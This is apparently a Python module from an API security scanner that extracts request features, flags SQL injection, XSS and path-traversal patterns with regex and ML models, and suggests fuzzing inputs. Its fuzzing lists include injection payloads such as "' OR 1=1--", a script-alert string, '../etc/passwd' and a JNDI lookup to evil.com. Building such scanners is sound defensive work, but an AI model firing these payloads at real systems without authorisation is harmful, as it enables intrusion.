"""
AI-Powered Vulnerability Detection Module

This module provides machine learning-based vulnerability detection capabilities
for API security scanning. It includes various ML models for different types
of vulnerability detection and can be configured by users.
"""

import json
import re
import logging
import pickle
import numpy as np
from typing import Dict, List, Any, Optional, Tuple, Union
from pathlib import Path
from datetime import datetime
import hashlib

# Optional ML dependencies - gracefully handle if not available
try:
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.ensemble import RandomForestClassifier, IsolationForest
    from sklearn.model_selection import train_test_split
    from sklearn.metrics import classification_report, accuracy_score
    from sklearn.preprocessing import StandardScaler
    import joblib
    ML_AVAILABLE = True
except ImportError:
    ML_AVAILABLE = False

from ..utils.logger import get_logger


class AIDetector:
    """
    AI-Powered vulnerability detection using machine learning models.
    
    This class provides various ML-based detection capabilities:
    - Anomaly detection for unusual API behavior
    - Pattern recognition for known vulnerability signatures
    - Risk scoring based on historical data
    - Intelligent fuzzing suggestions
    """
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """
        Initialize AI detector with configuration.
        
        Args:
            config: Configuration dictionary for AI detection settings
        """
        self.logger = get_logger(__name__)
        self.config = config or self._get_default_config()
        self.ml_available = ML_AVAILABLE
        
        if not self.ml_available:
            self.logger.warning("ML libraries not available. AI detection will use rule-based fallback.")
        
        # Initialize models
        self.models = {}
        self.vectorizers = {}
        self.scalers = {}
        self.model_path = Path("models")
        self.model_path.mkdir(exist_ok=True)
        
        # Load or initialize models
        self._initialize_models()
        
        # Training data storage
        self.training_data = {
            'vulnerabilities': [],
            'normal_requests': [],
            'anomalies': []
        }
    
    def _get_default_config(self) -> Dict[str, Any]:
        """Get default configuration for AI detection."""
        return {
            'enabled': True,
            'models': {
                'anomaly_detection': {
                    'enabled': True,
                    'threshold': 0.7,
                    'contamination': 0.1
                },
                'vulnerability_classification': {
                    'enabled': True,
                    'threshold': 0.8,
                    'min_samples': 10
                },
                'risk_scoring': {
                    'enabled': True,
                    'weights': {
                        'endpoint_complexity': 0.3,
                        'parameter_count': 0.2,
                        'authentication': 0.3,
                        'data_sensitivity': 0.2
                    }
                },
                'intelligent_fuzzing': {
                    'enabled': True,
                    'max_suggestions': 50,
                    'confidence_threshold': 0.6
                }
            },
            'learning': {
                'enabled': True,
                'auto_retrain': True,
                'retrain_interval': 100,  # scans
                'min_training_samples': 50
            },
            'fallback_to_rules': True
        }
    
    def _initialize_models(self):
        """Initialize or load ML models."""
        if not self.ml_available:
            return
        
        try:
            # Try to load existing models
            self._load_models()
        except Exception as e:
            self.logger.info(f"Could not load existing models: {e}. Initializing new models.")
            self._create_new_models()
    
    def _create_new_models(self):
        """Create new ML models."""
        if not self.ml_available:
            return
        
        # Anomaly detection model
        self.models['anomaly_detector'] = IsolationForest(
            contamination=self.config['models']['anomaly_detection']['contamination'],
            random_state=42
        )
        
        # Vulnerability classification model
        self.models['vulnerability_classifier'] = RandomForestClassifier(
            n_estimators=100,
            random_state=42,
            max_depth=10
        )
        
        # Text vectorizer for request analysis
        self.vectorizers['request_vectorizer'] = TfidfVectorizer(
            max_features=1000,
            stop_words='english',
            ngram_range=(1, 2)
        )
        
        # Feature scaler
        self.scalers['feature_scaler'] = StandardScaler()
        
        self.logger.info("Created new ML models")
    
    def _load_models(self):
        """Load existing models from disk."""
        if not self.ml_available:
            return
        
        model_files = {
            'anomaly_detector': 'anomaly_detector.pkl',
            'vulnerability_classifier': 'vulnerability_classifier.pkl',
            'request_vectorizer': 'request_vectorizer.pkl',
            'feature_scaler': 'feature_scaler.pkl'
        }
        
        for model_name, filename in model_files.items():
            model_path = self.model_path / filename
            if model_path.exists():
                if model_name in ['anomaly_detector', 'vulnerability_classifier']:
                    self.models[model_name] = joblib.load(model_path)
                elif model_name == 'request_vectorizer':
                    self.vectorizers[model_name] = joblib.load(model_path)
                elif model_name == 'feature_scaler':
                    self.scalers[model_name] = joblib.load(model_path)
        
        self.logger.info("Loaded existing ML models")
    
    def _save_models(self):
        """Save models to disk."""
        if not self.ml_available:
            return
        
        model_files = {
            'anomaly_detector': 'anomaly_detector.pkl',
            'vulnerability_classifier': 'vulnerability_classifier.pkl',
            'request_vectorizer': 'request_vectorizer.pkl',
            'feature_scaler': 'feature_scaler.pkl'
        }
        
        for model_name, filename in model_files.items():
            model_path = self.model_path / filename
            if model_name in ['anomaly_detector', 'vulnerability_classifier']:
                if model_name in self.models:
                    joblib.dump(self.models[model_name], model_path)
            elif model_name == 'request_vectorizer':
                if model_name in self.vectorizers:
                    joblib.dump(self.vectorizers[model_name], model_path)
            elif model_name == 'feature_scaler':
                if model_name in self.scalers:
                    joblib.dump(self.scalers[model_name], model_path)
        
        self.logger.info("Saved ML models to disk")
    
    def extract_features(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """
        Extract features from a request for ML analysis.
        
        Args:
            request: Request dictionary containing URL, method, headers, body
            
        Returns:
            Dictionary of extracted features
        """
        features = {}
        
        # URL features
        url = request.get('url', '')
        features['url_length'] = len(url)
        features['path_depth'] = len([p for p in url.split('/') if p])
        features['has_query_params'] = '?' in url
        features['query_param_count'] = len(url.split('?')[1].split('&')) if '?' in url else 0
        features['has_fragments'] = '#' in url
        
        # Method features
        method = request.get('method', 'GET')
        features['method_complexity'] = 1 if method in ['GET', 'HEAD'] else 2 if method in ['POST', 'PUT'] else 3
        
        # Header features
        headers = request.get('headers', {})
        features['header_count'] = len(headers)
        features['has_auth_header'] = any('auth' in h.lower() for h in headers.keys())
        features['has_content_type'] = 'content-type' in [h.lower() for h in headers.keys()]
        features['has_custom_headers'] = any(not h.lower().startswith(('content-', 'accept-', 'authorization', 'user-agent')) for h in headers.keys())
        
        # Body features
        body = request.get('body', '')
        features['body_length'] = len(body)
        features['has_json_body'] = 'application/json' in str(headers.get('Content-Type', '')).lower()
        features['has_xml_body'] = 'application/xml' in str(headers.get('Content-Type', '')).lower()
        features['has_form_data'] = 'application/x-www-form-urlencoded' in str(headers.get('Content-Type', '')).lower()
        
        # Content analysis
        if body:
            try:
                if features['has_json_body']:
                    json_data = json.loads(body)
                    features['json_depth'] = self._calculate_json_depth(json_data)
                    features['json_field_count'] = self._count_json_fields(json_data)
                else:
                    features['json_depth'] = 0
                    features['json_field_count'] = 0
            except:
                features['json_depth'] = 0
                features['json_field_count'] = 0
        
        # Security-related features
        features['has_sensitive_patterns'] = self._detect_sensitive_patterns(url, body, headers)
        features['has_sql_patterns'] = self._detect_sql_patterns(body)
        features['has_xss_patterns'] = self._detect_xss_patterns(body)
        features['has_path_traversal'] = self._detect_path_traversal(url, body)
        
        return features
    
    def _calculate_json_depth(self, obj: Any, current_depth: int = 0) -> int:
        """Calculate the maximum depth of a JSON object."""
        if isinstance(obj, dict):
            if not obj:
                return current_depth
            return max(self._calculate_json_depth(v, current_depth + 1) for v in obj.values())
        elif isinstance(obj, list):
            if not obj:
                return current_depth
            return max(self._calculate_json_depth(item, current_depth + 1) for item in obj)
        else:
            return current_depth
    
    def _count_json_fields(self, obj: Any) -> int:
        """Count the total number of fields in a JSON object."""
        if isinstance(obj, dict):
            return len(obj) + sum(self._count_json_fields(v) for v in obj.values())
        elif isinstance(obj, list):
            return sum(self._count_json_fields(item) for item in obj)
        else:
            return 0
    
    def _detect_sensitive_patterns(self, url: str, body: str, headers: Dict[str, str]) -> int:
        """Detect sensitive patterns in request data."""
        sensitive_patterns = [
            r'password', r'secret', r'token', r'key', r'credential',
            r'ssn', r'social', r'credit', r'card', r'bank',
            r'private', r'confidential', r'personal'
        ]
        
        text = f"{url} {body} {' '.join(headers.values())}".lower()
        return sum(1 for pattern in sensitive_patterns if re.search(pattern, text))
    
    def _detect_sql_patterns(self, body: str) -> int:
        """Detect SQL injection patterns."""
        sql_patterns = [
            r'union\s+select', r'drop\s+table', r'delete\s+from',
            r'insert\s+into', r'update\s+set', r'exec\s*\(',
            r'xp_cmdshell', r'sp_executesql', r';\s*drop\s+table',
            r';\s*delete\s+from', r';\s*insert\s+into', r';\s*update\s+set',
            r'--\s*$', r'/\*.*\*/', r';\s*--', r';\s*#',
            r'select\s+.*\s+from', r'where\s+.*=', r'order\s+by',
            r'group\s+by', r'having\s+.*=', r'and\s+.*=', r'or\s+.*='
        ]
        
        return sum(1 for pattern in sql_patterns if re.search(pattern, body.lower()))
    
    def _detect_xss_patterns(self, body: str) -> int:
        """Detect XSS patterns."""
        xss_patterns = [
            r'<script', r'javascript:', r'onload=', r'onerror=',
            r'<iframe', r'<object', r'<embed', r'<link'
        ]
        
        return sum(1 for pattern in xss_patterns if re.search(pattern, body.lower()))
    
    def _detect_path_traversal(self, url: str, body: str) -> int:
        """Detect path traversal patterns."""
        traversal_patterns = [
            r'\.\./', r'\.\.\\', r'%2e%2e%2f', r'%2e%2e%5c',
            r'\.\.%2f', r'\.\.%5c'
        ]
        
        text = f"{url} {body}"
        return sum(1 for pattern in traversal_patterns if re.search(pattern, text.lower()))
    
    def detect_anomalies(self, requests: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Detect anomalous requests using ML models.
        
        Args:
            requests: List of request dictionaries
            
        Returns:
            List of anomaly detection results
        """
        if not self.config['models']['anomaly_detection']['enabled']:
            return []
        
        if not self.ml_available or 'anomaly_detector' not in self.models:
            return self._rule_based_anomaly_detection(requests)
        
        anomalies = []
        
        try:
            # Extract features for all requests
            features_list = []
            for request in requests:
                features = self.extract_features(request)
                features_list.append(list(features.values()))
            
            if not features_list:
                return anomalies
            
            # Convert to numpy array
            X = np.array(features_list)
            
            # Scale features
            if 'feature_scaler' in self.scalers:
                X = self.scalers['feature_scaler'].fit_transform(X)
            
            # Predict anomalies
            anomaly_scores = self.models['anomaly_detector'].decision_function(X)
            is_anomaly = self.models['anomaly_detector'].predict(X)
            
            # Process results
            threshold = self.config['models']['anomaly_detection']['threshold']
            for i, (request, score, anomaly) in enumerate(zip(requests, anomaly_scores, is_anomaly)):
                if anomaly == -1 or score < threshold:
                    anomalies.append({
                        'request': request,
                        'anomaly_score': float(score),
                        'is_anomaly': bool(anomaly == -1),
                        'confidence': float(abs(score)),
                        'detection_method': 'ml_anomaly_detection'
                    })
        
        except Exception as e:
            self.logger.error(f"Error in ML anomaly detection: {e}")
            return self._rule_based_anomaly_detection(requests)
        
        return anomalies
    
    def _rule_based_anomaly_detection(self, requests: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Fallback rule-based anomaly detection."""
        anomalies = []
        
        for request in requests:
            features = self.extract_features(request)
            
            # Rule-based anomaly detection
            anomaly_score = 0
            reasons = []
            
            # Unusual URL patterns
            if features['url_length'] > 200:
                anomaly_score += 0.3
                reasons.append("Unusually long URL")
            
            if features['path_depth'] > 10:
                anomaly_score += 0.2
                reasons.append("Deep path structure")
            
            # Unusual parameter counts
            if features['query_param_count'] > 20:
                anomaly_score += 0.2
                reasons.append("High number of query parameters")
            
            # Unusual body size
            if features['body_length'] > 10000:
                anomaly_score += 0.2
                reasons.append("Large request body")
            
            # Security patterns
            if features['has_sensitive_patterns'] > 0:
                anomaly_score += 0.3
                reasons.append("Contains sensitive patterns")
            
            if features['has_sql_patterns'] > 0:
                anomaly_score += 0.4
                reasons.append("Contains SQL injection patterns")
            
            if features['has_xss_patterns'] > 0:
                anomaly_score += 0.3
                reasons.append("Contains XSS patterns")
            
            if features['has_path_traversal'] > 0:
                anomaly_score += 0.4
                reasons.append("Contains path traversal patterns")
            
            if anomaly_score > 0.5:
                anomalies.append({
                    'request': request,
                    'anomaly_score': anomaly_score,
                    'is_anomaly': True,
                    'confidence': min(anomaly_score, 1.0),
                    'detection_method': 'rule_based_anomaly_detection',
                    'reasons': reasons
                })
        
        return anomalies
    
    def classify_vulnerabilities(self, requests: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Classify potential vulnerabilities using ML models.
        
        Args:
            requests: List of request dictionaries
            
        Returns:
            List of vulnerability classification results
        """
        if not self.config['models']['vulnerability_classification']['enabled']:
            return []
        
        if not self.ml_available or 'vulnerability_classifier' not in self.models:
            return self._rule_based_vulnerability_classification(requests)
        
        classifications = []
        
        try:
            # Extract features
            features_list = []
            for request in requests:
                features = self.extract_features(request)
                features_list.append(list(features.values()))
            
            if not features_list:
                return classifications
            
            # Convert to numpy array
            X = np.array(features_list)
            
            # Scale features
            if 'feature_scaler' in self.scalers:
                X = self.scalers['feature_scaler'].fit_transform(X)
            
            # Predict vulnerabilities
            predictions = self.models['vulnerability_classifier'].predict(X)
            probabilities = self.models['vulnerability_classifier'].predict_proba(X)
            
            # Process results
            threshold = self.config['models']['vulnerability_classification']['threshold']
            for i, (request, pred, prob) in enumerate(zip(requests, predictions, probabilities)):
                max_prob = max(prob)
                if max_prob > threshold:
                    classifications.append({
                        'request': request,
                        'vulnerability_type': pred,
                        'confidence': float(max_prob),
                        'all_probabilities': {str(k): float(v) for k, v in enumerate(prob)},
                        'detection_method': 'ml_vulnerability_classification'
                    })
        
        except Exception as e:
            self.logger.error(f"Error in ML vulnerability classification: {e}")
            return self._rule_based_vulnerability_classification(requests)
        
        return classifications
    
    def _rule_based_vulnerability_classification(self, requests: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Fallback rule-based vulnerability classification."""
        classifications = []
        
        for request in requests:
            features = self.extract_features(request)
            vulnerabilities = []
            
            # SQL Injection
            if features['has_sql_patterns'] > 0:
                vulnerabilities.append({
                    'type': 'sql_injection',
                    'confidence': min(features['has_sql_patterns'] * 0.3, 1.0)
                })
            
            # XSS
            if features['has_xss_patterns'] > 0:
                vulnerabilities.append({
                    'type': 'xss',
                    'confidence': min(features['has_xss_patterns'] * 0.3, 1.0)
                })
            
            # Path Traversal
            if features['has_path_traversal'] > 0:
                vulnerabilities.append({
                    'type': 'path_traversal',
                    'confidence': min(features['has_path_traversal'] * 0.4, 1.0)
                })
            
            # Information Disclosure
            if features['has_sensitive_patterns'] > 2:
                vulnerabilities.append({
                    'type': 'information_disclosure',
                    'confidence': min(features['has_sensitive_patterns'] * 0.2, 1.0)
                })
            
            for vuln in vulnerabilities:
                if vuln['confidence'] > 0.5:
                    classifications.append({
                        'request': request,
                        'vulnerability_type': vuln['type'],
                        'confidence': vuln['confidence'],
                        'detection_method': 'rule_based_vulnerability_classification'
                    })
        
        return classifications
    
    def calculate_risk_score(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """
        Calculate risk score for a request using ML and rule-based methods.
        
        Args:
            request: Request dictionary
            
        Returns:
            Risk score and breakdown
        """
        if not self.config['models']['risk_scoring']['enabled']:
            return {'risk_score': 0.0, 'breakdown': {}}
        
        features = self.extract_features(request)
        weights = self.config['models']['risk_scoring']['weights']
        
        # Calculate component scores
        endpoint_complexity = min(features['path_depth'] / 10.0, 1.0)
        parameter_count = min(features['query_param_count'] / 20.0, 1.0)
        authentication = 0.8 if features['has_auth_header'] else 0.2
        data_sensitivity = min(features['has_sensitive_patterns'] / 5.0, 1.0)
        
        # Calculate weighted risk score
        risk_score = (
            endpoint_complexity * weights['endpoint_complexity'] +
            parameter_count * weights['parameter_count'] +
            authentication * weights['authentication'] +
            data_sensitivity * weights['data_sensitivity']
        )
        
        # Adjust for security patterns
        if features['has_sql_patterns'] > 0:
            risk_score += 0.3
        if features['has_xss_patterns'] > 0:
            risk_score += 0.2
        if features['has_path_traversal'] > 0:
            risk_score += 0.3
        
        risk_score = min(risk_score, 1.0)
        
        return {
            'risk_score': risk_score,
            'breakdown': {
                'endpoint_complexity': endpoint_complexity,
                'parameter_count': parameter_count,
                'authentication': authentication,
                'data_sensitivity': data_sensitivity,
                'security_patterns': features['has_sql_patterns'] + features['has_xss_patterns'] + features['has_path_traversal']
            },
            'risk_level': self._get_risk_level(risk_score)
        }
    
    def _get_risk_level(self, score: float) -> str:
        """Convert risk score to risk level."""
        if score >= 0.8:
            return 'Critical'
        elif score >= 0.6:
            return 'High'
        elif score >= 0.4:
            return 'Medium'
        elif score >= 0.2:
            return 'Low'
        else:
            return 'Minimal'
    
    def generate_fuzzing_suggestions(self, request: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Generate intelligent fuzzing suggestions based on ML analysis.
        
        Args:
            request: Request dictionary
            
        Returns:
            List of fuzzing suggestions
        """
        if not self.config['models']['intelligent_fuzzing']['enabled']:
            return []
        
        suggestions = []
        features = self.extract_features(request)
        max_suggestions = self.config['models']['intelligent_fuzzing']['max_suggestions']
        threshold = self.config['models']['intelligent_fuzzing']['confidence_threshold']
        
        # URL-based suggestions
        if features['has_query_params']:
            suggestions.append({
                'type': 'query_parameter_fuzzing',
                'description': 'Fuzz query parameters with malicious payloads',
                'confidence': 0.8,
                'payloads': ['../etc/passwd', 'admin', 'test', 'null', 'undefined']
            })
        
        # Body-based suggestions
        if features['has_json_body']:
            suggestions.append({
                'type': 'json_field_fuzzing',
                'description': 'Fuzz JSON fields with injection payloads',
                'confidence': 0.7,
                'payloads': ['<script>alert(1)</script>', "' OR 1=1--", '${jndi:ldap://evil.com}']
            })
        
        # Header-based suggestions
        if features['has_custom_headers']:
            suggestions.append({
                'type': 'header_injection',
                'description': 'Test for header injection vulnerabilities',
                'confidence': 0.6,
                'payloads': ['../etc/passwd', 'admin', 'test']
            })
        
        # Method-based suggestions
        if features['method_complexity'] > 1:
            suggestions.append({
                'type': 'method_override',
                'description': 'Test HTTP method override vulnerabilities',
                'confidence': 0.5,
                'payloads': ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
            })
        
        # Filter by confidence and limit suggestions
        suggestions = [s for s in suggestions if s['confidence'] >= threshold]
        return suggestions[:max_suggestions]
    
    def learn_from_results(self, requests: List[Dict[str, Any]], results: List[Dict[str, Any]]):
        """
        Learn from scanning results to improve ML models.
        
        Args:
            requests: List of requests that were scanned
            results: List of vulnerability results
        """
        if not self.config['learning']['enabled'] or not self.ml_available:
            return
        
        # Store training data
        for request, result in zip(requests, results):
            if result.get('vulnerabilities'):
                self.training_data['vulnerabilities'].append({
                    'request': request,
                    'vulnerabilities': result['vulnerabilities'],
                    'timestamp': datetime.now().isoformat()
                })
            else:
                self.training_data['normal_requests'].append({
                    'request': request,
                    'timestamp': datetime.now().isoformat()
                })
        
        # Check if we should retrain
        total_samples = len(self.training_data['vulnerabilities']) + len(self.training_data['normal_requests'])
        if (self.config['learning']['auto_retrain'] and 
            total_samples >= self.config['learning']['min_training_samples'] and
            total_samples % self.config['learning']['retrain_interval'] == 0):
            
            self.retrain_models()
    
    def retrain_models(self):
        """Retrain ML models with accumulated data."""
        if not self.ml_available or not self.training_data['vulnerabilities']:
            return
        
        try:
            self.logger.info("Retraining ML models...")
            
            # Prepare training data
            X = []
            y = []
            
            # Add vulnerability samples
            for sample in self.training_data['vulnerabilities']:
                features = self.extract_features(sample['request'])
                X.append(list(features.values()))
                y.append(1)  # Vulnerable
            
            # Add normal samples
            for sample in self.training_data['normal_requests']:
                features = self.extract_features(sample['request'])
                X.append(list(features.values()))
                y.append(0)  # Normal
            
            if len(X) < self.config['learning']['min_training_samples']:
                self.logger.info("Not enough training data for retraining")
                return
            
            # Convert to numpy arrays
            X = np.array(X)
            y = np.array(y)
            
            # Split data
            X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
            
            # Scale features
            X_train_scaled = self.scalers['feature_scaler'].fit_transform(X_train)
            X_test_scaled = self.scalers['feature_scaler'].transform(X_test)
            
            # Retrain models
            self.models['vulnerability_classifier'].fit(X_train_scaled, y_train)
            self.models['anomaly_detector'].fit(X_train_scaled)
            
            # Evaluate models
            y_pred = self.models['vulnerability_classifier'].predict(X_test_scaled)
            accuracy = accuracy_score(y_test, y_pred)
            
            self.logger.info(f"Model retraining completed. Accuracy: {accuracy:.3f}")
            
            # Save updated models
            self._save_models()
            
        except Exception as e:
            self.logger.error(f"Error retraining models: {e}")
    
    def get_model_status(self) -> Dict[str, Any]:
        """Get status of ML models and AI detection capabilities."""
        status = {
            'ml_available': self.ml_available,
            'config': self.config,
            'models_loaded': list(self.models.keys()),
            'vectorizers_loaded': list(self.vectorizers.keys()),
            'scalers_loaded': list(self.scalers.keys()),
            'training_data': {
                'vulnerabilities': len(self.training_data['vulnerabilities']),
                'normal_requests': len(self.training_data['normal_requests']),
                'anomalies': len(self.training_data['anomalies'])
            }
        }
        
        return status
